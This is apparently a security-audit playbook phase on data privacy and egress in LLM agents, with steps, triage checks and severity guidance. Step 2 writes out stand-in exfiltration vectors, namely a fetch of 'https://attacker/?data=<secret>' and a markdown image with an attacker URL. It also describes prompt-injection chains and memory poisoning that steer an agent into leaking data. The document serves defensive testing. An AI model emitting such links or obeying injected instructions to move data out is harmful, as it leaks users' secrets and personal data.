# Phase 3 — Data Privacy & Egress

Where can sensitive data go, intentionally or not? Maps to OWASP LLM02 (Sensitive Information Disclosure), LLM05 (Improper Output Handling), and data-protection obligations (GDPR/DPDP/sector rules). For an enterprise/client-facing agent this is often the finding leadership cares about most.

## Step 1 — Inventory sensitive data the agent can reach
Classify every data source from Phase 0: public / internal / PII / regulated (health, financial, etc.) / secrets (keys, creds). For each, note: does it enter the model context? does it get logged? does it leave the tenancy?

## Step 2 — Map every egress path (be paranoid — egress hides)
Obvious: HTTP/webhook tools, email/message send, DB writes to readable tables, file writes to shared/synced locations.
Non-obvious (these are where leaks actually happen):
- **URLs/parameters**: an injected instruction that makes the agent fetch `https://attacker/?data=<secret>` — the secret leaves in the query string.
- **Markdown image rendering**: agent emits `![](https://attacker/?data=...)` and a client auto-loads it → exfil with zero clicks. Check if the UI renders model-produced images/links.
- **Error messages & logs**: secrets/PII written to logs that are shipped to a third-party observability service, or shown in errors.
- **Model provider**: is sensitive data sent to the LLM API at all? Under what data-retention terms? Is a zero-retention / enterprise tier used? Is data residency satisfied?
- **Tool telemetry**: MCP servers / third-party tools may log the arguments they receive.
- **Caches, transcripts, memory stores** that persist sensitive content beyond the session.

## Step 3 — Test the exfiltration chains
For each (sensitive source → egress path) pair, ask: can untrusted input (Phase 1) steer the agent to move data from the source to the egress? That is the exfiltration finding. The markdown-image and URL-parameter vectors are the canonical zero-click cases — test them explicitly if the agent has any web/fetch/render capability.

## Step 4 — Privacy-by-design checks
- **Data minimization**: does the agent pull more sensitive data into context than the task needs? (Over-retrieval is both a privacy and an injection-surface problem.)
- **Redaction/masking**: is PII masked before hitting the model or logs?
- **Output filtering**: is model output scanned for leaked secrets/PII before it's shown/sent/logged?
- **Retention**: are prompts, completions, and tool I/O stored? for how long? who can read them?
- **Consent & purpose limitation**: for client data (e.g., a customer's records), is the use authorized and scoped?
- **Tenant isolation**: in multi-user/multi-client settings, can one tenant's data surface in another's session?
- **Training/feedback loops**: is captured data used to fine-tune or improve anything? with what consent?

## Step 5 — Memory & state leakage (long-running agents)
For agents with persistent memory (account-level assistants, etc.): can data from a privileged context leak into a less-privileged later context? Can poisoned memory cause later disclosure? Is memory scoped per user/tenant?

## Top-5 fast checks (triage mode)
1. Agent has read-sensitive AND any egress with no gate? → Critical (exfil chain).
2. Does the client render model-produced markdown images/links? → High (zero-click exfil).
3. Are secrets/PII written to third-party logs or shown in errors? → High.
4. Is sensitive data sent to the LLM API without a retention/residency guarantee? → Medium–High (compliance).
5. In multi-tenant use, is per-tenant isolation enforced? → Critical if not.

## Severity guidance
- Reachable exfiltration of regulated PII or secrets by an external attacker = **Critical**.
- Zero-click exfil vector (markdown image / auto-fetch) = Critical/High.
- PII/secrets in third-party logs = High.
- Compliance gaps (retention, residency, consent) = Medium–High depending on regime and data class.
- Over-retrieval / weak minimization = Medium.
